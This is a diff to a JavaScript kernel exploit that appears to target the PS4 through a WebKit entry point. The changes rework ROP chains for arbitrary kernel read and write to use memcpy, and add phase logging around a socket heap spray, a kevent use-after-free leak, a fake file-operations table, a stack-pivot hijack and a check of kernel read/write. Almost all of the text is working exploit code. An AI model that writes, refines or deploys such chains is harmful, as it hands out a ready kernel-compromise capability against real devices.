@@ -1,4 +1,4 @@
-// kevent_krw_final.js — full build, offsets wired, hijack active, R/W verified
+// kevent_krw_final.js — full build, exact WebKit gadgets, memcpy ROP, numbered phases
 import { int64 } from "./int64.js";
 import { PS4, offsetsFor } from "./offsets.js";
 
@@ -256,20 +256,23 @@ function push(v) { ctx().p.write8(toI64(gSTACK + BigInt(wPos * 8)), toI64(v)); w
 
 function buildKread(targetAddr) {
   wPos = 0;
-  push(ROP.POP_RDI); push(gCTX); push(ROP.POP_RAX); push(ROP.MOV_RDI_RSI_30_CALL);
-  push(ROP.POP_RAX); push(targetAddr);
-  push(ROP.MOV_RDI_RAX_8_CALL_20);
+  push(ROP.POP_RBP); push(gCTX);
   push(ROP.POP_RDI); push(gRES);
-  push(ROP.MOV_QWORD_PTR_RDI_RAX_RET);
+  push(ROP.POP_RSI); push(targetAddr);
+  push(ROP.POP_RDX); push(8n);
+  push(ROP.POP_RSI); push(ROP.MEMCPY);
+  push(ROP.JMP_RSI);
   push(ROP.LEAVE_RET);
 }
 
 function buildKwrite(targetAddr, value) {
   wPos = 0;
-  push(ROP.POP_RDI); push(gCTX); push(ROP.POP_RAX); push(ROP.MOV_RDI_RSI_30_CALL);
+  push(ROP.POP_RBP); push(gCTX);
   push(ROP.POP_RDI); push(targetAddr);
-  push(ROP.POP_RAX); push(value);
-  push(ROP.MOV_QWORD_PTR_RDI_RAX_RET);
+  push(ROP.POP_RSI); push(gRES);
+  push(ROP.POP_RDX); push(8n);
+  push(ROP.POP_RSI); push(ROP.MEMCPY);
+  push(ROP.JMP_RSI);
   push(ROP.LEAVE_RET);
 }
 
@@ -284,16 +287,16 @@ function setupKernelRW() {
   gIDENT = 0xdeadbeef12345678n;
 
   ROP = {
+    POP_RBP: ka(off.wk_POP_RBP_RET),
     POP_RDI: ka(off.wk_POP_RDI_RET),
     POP_RSI: ka(off.wk_POP_RSI_RET),
     POP_RDX: ka(off.wk_POP_RDX_RET),
     POP_RAX: ka(off.wk_POP_RAX_RET),
     LEAVE_RET: ka(off.wk_LEAVE_RET),
+    JMP_RSI: ka(off.k_jmp_rsi),
+    MEMCPY: ka(off.k_memcpy),
     MOV_QWORD_PTR_RDI_RAX_RET: ka(off.wk_MOV_QWORD_PTR_RDI_RAX_RET),
-    MOV_RDI_RSI_30_CALL: ka(off.wk_MOV_RDI_RSI_30_CALL),
-    MOV_RDI_RAX_8_CALL_20: ka(off.wk_MOV_RDI_RAX_8_CALL_20),
-    PIVOT: ka(off.k_jmp_rsi),
-    TOUCH: ka(off.wk_PUSH_RDX_POP_RSP_RET)
+    PIVOT: ka(off.wk_PUSH_RDX_POP_RSP_RET)
   };
 
   p.write8(toI64(gCTX), toI64(MARKV));
@@ -322,6 +325,7 @@ function kread(targetAddr) {
 }
 
 function kwrite(targetAddr, value) {
+  ctx().p.write8(toI64(gRES), toI64(value));
   buildKwrite(targetAddr, value);
   fireROP(false);
   return true;
@@ -364,8 +368,16 @@ export async function runKevent(c) {
   }
 
   try {
+    // ==========================================
+    // STEP 1: STUB RESOLUTION
+    // ==========================================
+    log("STEP-1", "resolving syscall stubs");
     ensureStubs();
 
+    // ==========================================
+    // STEP 2: HEAP SPRAY
+    // ==========================================
+    log("STEP-2", "spraying zone-256");
     const burn = [];
     for (let i = 0; i < 200; i++) { const fd = scn("socket", AF_INET, SOCK_STREAM, 0); if (fd >= 0) burn.push(fd); }
     log("FD-BURN", "burned " + burn.length + " fds");
@@ -379,10 +391,18 @@ export async function runKevent(c) {
     STATE.leakKq = scn("kqueue");
     if (STATE.leakKq < 0) throw new Error("leak kqueue failed");
 
+    // ==========================================
+    // STEP 3: THE LEAK (UAF)
+    // ==========================================
+    log("STEP-3", "starting kevent leak loop");
     const res = phase2Leak(STATE.leakKq, STATE.fds);
     STATE.kva = res.kva;
     STATE.targetFd = res.targetFd;
 
+    // ==========================================
+    // STEP 4: FAKE OPS + ROP SETUP
+    // ==========================================
+    log("STEP-4", "mapping fake page and building ROP");
     if (typeof gc === "function") gc();
     const mrf = scn64("mmap", 0, 0x10000, 7, 0x1002, -1, 0);
     const fake_page = (BigInt(mrf.hi >>> 0) << 32n) | BigInt(mrf.lo >>> 0);
@@ -397,7 +417,7 @@ export async function runKevent(c) {
     
     for (let i = 0; i < 32; i++) p.write8(toI64(F_FAKE_OPS + BigInt(i * 8)), toI64(ka(off.wk_RET)));
     p.write4(toI64(F_FAKE_OPS), 0);
-    p.write8(toI64(F_FAKE_OPS + 0x18n), toI64(ka(off.wk_PUSH_RDX_POP_RSP_RET)));
+    p.write8(toI64(F_FAKE_OPS + 0x18n), toI64(ka(off.wk_PUSH_RDX_POP_RSP_RET))); // f_touch
     log("STAGE3-OPS", "fake fileops at " + h16(F_FAKE_OPS));
 
     setupKernelRW();
@@ -415,7 +435,10 @@ export async function runKevent(c) {
       STATE.kbase = found;
     }
 
-    // HIJACK TRIGGER
+    // ==========================================
+    // STEP 5: THE HIJACK
+    // ==========================================
+    log("STEP-5", "hijacking knote f_ops");
     gKQ = scn("kqueue");
     if (gKQ < 0) throw new Error("trigger kqueue failed");
 
@@ -433,6 +456,10 @@ export async function runKevent(c) {
     log("STAGE6-TRIGGER", "firing kevent(-23) for ROP");
     fireROP(false);
 
+    // ==========================================
+    // STEP 6: R/W VERIFY
+    // ==========================================
+    log("STEP-6", "verifying kernel R/W");
     const se11_narg = ka(off.k_sysent_661) + 4n;
     const orig_narg = kread(se11_narg);
     log("VERIFY-R", "sysent[11].sy_narg = " + h16(orig_narg));
